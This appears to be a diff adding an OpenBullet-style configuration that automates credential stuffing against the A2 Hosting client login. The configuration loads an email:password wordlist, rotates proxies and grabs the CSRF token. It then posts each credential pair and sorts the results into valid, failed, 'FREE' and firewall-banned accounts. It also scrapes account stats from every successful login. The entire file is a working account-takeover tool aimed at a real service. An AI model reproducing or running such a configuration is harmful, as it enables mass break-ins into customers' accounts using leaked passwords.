@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "A2Hosting",
+  "SuggestedBots": 100,
+  "LastModified": "2018-12-12T23:51:16.9398497+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_COOKIES REQUEST GET "https://my.a2hosting.com/clientarea.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "You accidentally triggered our security firewall" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "csrfToken = '" "'" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://my.a2hosting.com/dologin.php" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://my.a2hosting.com/dologin.php" 
+  HEADER "Origin: https://my.a2hosting.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY ">Logout<" 
+    KEY "Welcome Back," 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Retry OR 
+    KEY "Something went wrong and we couldn't process your request." 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "It appears you do not have any products/services with us yet" 
+  KEYCHAIN Ban OR 
+    KEY "You accidentally triggered our security firewall" 
+PARSE "<SOURCE>" REGEX "stat\\">([^<]*)<\/div>\\s*<div class=\\"title\\">([^<]*)" "[1][2]" Recursive=FALSE -> VAR "" "" "" 
